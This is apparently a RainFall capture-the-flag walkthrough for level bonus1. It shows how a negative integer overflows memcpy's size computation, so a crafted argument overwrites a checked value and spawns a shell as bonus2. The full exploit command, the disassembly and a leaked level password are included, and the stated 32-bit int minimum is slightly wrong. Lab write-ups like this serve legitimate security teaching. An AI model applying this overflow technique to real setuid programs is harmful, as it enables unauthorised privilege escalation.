# RainFall Walkthrough — Bonus1 -> 2

## Step 1 — Initial Recon

We start as **bonus1**:

```bash
bonus1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
```

Running the binary:

```bash
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)

bonus1@RainFall:~$ ./bonus1 bla
bonus1@RainFall:~$
```

Observations:

* No arguments → **segmentation fault**.
* One argument → program exits silently.
* Analysis with **GDB** shows only `main()` exists.
* The binary takes **two arguments**, and there’s a `memcpy()` vulnerable to **buffer overflow**.

> For full source-level explanations, see `asm_analysis.md` alongside `source.c`.

---

## Step 2 — Understanding Argument Handling

1. **First argument** (`argv[1]`) is converted to an integer using `atoi()`.

   * Stored in `nb`.
   * Normally, `nb` must be ≤ 9 to reach the vulnerable `memcpy()`.

2. **Second argument** (`argv[2]`) is copied into a buffer located **40 bytes above `nb`**.

3. `nb` is compared to `0x574f4c46`. If equal → program calls `execl()` to escalate privileges.

4. `memcpy()` copies **4 × nb bytes** from `argv[2]` into the buffer.

   * Maximum normal copy: `9 × 4 = 36 bytes`.

---

## Step 3 — Exploiting with Negative Numbers

* Instead of a positive `nb`, we can supply a **negative integer**.
* How it works:

```text
32-bit signed int minimum: int_min = -2147483647
int_min * 4 → overflow occurs, but lower 32 bits are used
```

* We “cheat” to get **44 bytes copied**:

```text
random_int = -2147483637
random_int * 4 = 44 (mod 2^32)
```

* Now `memcpy()` will copy 44 bytes — enough to overwrite `nb` and inject the target value.

---

## Step 4 — Crafting the Payload

**First argument**: `-2147483637` → triggers `memcpy()` to copy 44 bytes.

**Second argument**:

* First 40 bytes → padding (`"A" * 40`).
* Last 4 bytes → overwrite `nb` with `0x574f4c46`.

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

---

## Step 5 — Execution and Privilege Escalation

Running the exploit:

```bash
$ whoami
bonus2

$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

$ su bonus2
Password: <use retrieved password>
```

Binary protections for `bonus2`:

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
```

* No stack canary, NX disabled → stack/heap code execution possible.
* No PIE → fixed addresses make exploitation predictable.

---

## Step 6 — Understanding the Assembly

Dump of `main()`:

```asm
0x08048424 <+0>:  push   %ebp
0x08048425 <+1>:  mov    %esp,%ebp
0x08048427 <+3>:  and    $0xfffffff0,%esp
0x0804842a <+6>:  sub    $0x40,%esp
0x0804842d <+9>:  mov    0xc(%ebp),%eax      ; argv
0x08048430 <+12>: add    $0x4,%eax
0x08048433 <+15>: mov    (%eax),%eax        ; argv[1]
0x08048435 <+17>: mov    %eax,(%esp)
0x08048438 <+20>: call   0x8048360 <atoi@plt>
0x0804843d <+25>: mov    %eax,0x3c(%esp)   ; nb stored on stack
0x08048441 <+29>: cmpl   $0x9,0x3c(%esp)
0x08048446 <+34>: jle    0x804844f <main+43> ; only proceed if nb <= 9
0x08048448 <+36>: mov    $0x1,%eax
0x0804844d <+41>: jmp    0x80484a3 <main+127>
0x0804844f <+43>: mov    0x3c(%esp),%eax
0x08048453 <+47>: lea    0x0(,%eax,4),%ecx      ; ecx = nb * 4
0x0804845a <+54>: mov    0xc(%ebp),%eax
0x0804845d <+57>: add    $0x8,%eax
0x08048460 <+60>: mov    (%eax),%eax        ; argv[2]
0x08048462 <+62>: mov    %eax,%edx
0x08048464 <+64>: lea    0x14(%esp),%eax     ; buffer
0x08048468 <+68>: mov    %ecx,0x8(%esp)
0x0804846c <+72>: mov    %edx,0x4(%esp)
0x08048470 <+76>: mov    %eax,(%esp)
0x08048473 <+79>: call   0x8048320 <memcpy@plt>
0x08048478 <+84>: cmpl   $0x574f4c46,0x3c(%esp)
0x08048480 <+92>: jne    0x804849e <main+122>
0x08048482 <+94>: movl   $0x0,0x8(%esp)
0x0804848a <+102>: movl   $0x8048580,0x4(%esp)
0x08048492 <+110>: movl   $0x8048583,(%esp)
0x08048499 <+117>: call   0x8048350 <execl@plt>
0x0804849e <+122>: mov    $0x0,%eax
0x080484a3 <+127>: leave
0x080484a4 <+128>: ret
```

### Key Observations

* `nb` stored at `0x3c(%esp)`.
* `cmpl $0x574f4c46, 0x3c(%esp)` → check if `nb` matches magic value.
* If yes → call `execl("/bin/sh")`.
* `memcpy()` copies **4 × nb bytes** → negative `nb` allows >36 bytes to overflow safely.

---

## Step 7 — Exploit Mechanics Summary

| Step | What happens                                                                   |
| ---- | ------------------------------------------------------------------------------ |
| 1    | Supply first arg `-2147483637` → triggers `memcpy()` to copy 44 bytes.         |
| 2    | Second arg → `"A"*40 + "\x46\x4c\x4f\x57"` → overwrite `nb` with `0x574f4c46`. |
| 3    | Program checks `nb` → matches magic number → calls `execl()` → shell spawned.  |
| 4    | Gain **bonus2** privileges and retrieve `.pass`.                               |

> Learning point: Integer overflow + buffer overflow allows **arbitrary memory write**, which can bypass logical checks.

---

## Step 8 — Running the Exploit

```bash
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2

$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```